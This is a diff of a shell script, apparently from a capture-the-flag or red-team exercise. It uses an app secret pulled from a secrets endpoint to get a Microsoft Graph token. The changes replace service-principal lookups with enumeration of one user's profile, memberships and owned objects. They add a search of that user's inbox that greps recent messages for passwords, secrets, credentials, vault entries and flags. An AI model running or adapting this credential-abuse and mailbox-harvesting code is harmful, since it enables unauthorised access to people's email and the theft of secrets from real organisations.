@@ -7,9 +7,11 @@ S=$(curl -sS --max-time 20 -H "Authorization: Bearer $B" "$PROD/secrets/director
 A=$(echo "$S"|jq -r '.value|fromjson|.appId // empty'); P=$(echo "$S"|jq -r '.value|fromjson|.clientSecret // empty'); TT=$(echo "$S"|jq -r '.value|fromjson|.tenantId // empty')
 GT=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" -d 'scope=https://graph.microsoft.com/.default' | jq -r '.access_token // empty')
 say "GRAPH=$([[ -n "$GT" ]] && echo OK || echo FAIL)"; [[ -n "$GT" ]] || exit 0
-for oid in d2cdf247-9319-40cb-8324-5a005ef538da 63e87ab1-6bd2-4e80-92be-943450b20e4f 1fe7a412-82e9-4135-ab4b-72a0be429adb 43834909-47cf-4a4a-8048-e323b4897ed3; do
-  say "=== $oid"
-  curl -sS --max-time 20 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals/$oid?\$select=displayName,appId,id,servicePrincipalType" -o /tmp/sp
-  jq -c . /tmp/sp 2>/dev/null | head -c 500; echo
+OID='d2cdf247-9319-40cb-8324-5a005ef538da'
+for path in "users/$OID?\$select=displayName,userPrincipalName,mail,id" "users/$OID/memberOf?\$select=displayName,id" "users/$OID/ownedObjects?\$select=displayName,id" "groups/$OID?\$select=displayName,id"; do
+  say "=== $path"; code=$(curl -sS --max-time 20 -o /tmp/g -w '%{http_code}' -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/$path"); say "HTTP=$code"; head -c 1200 /tmp/g; echo
 done
+say '=== INBOX SEARCH ==='
+curl -sS --max-time 25 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/users/$OID/messages?\$top=50&\$select=subject,bodyPreview,from,receivedDateTime" -o /tmp/mail
+jq -r '.value[]? | [.receivedDateTime,.from.emailAddress.address,.subject,.bodyPreview] | @tsv' /tmp/mail 2>/dev/null | grep -aiE 'DF26|flag|password|secret|credential|vault' | head -20
 say DONE
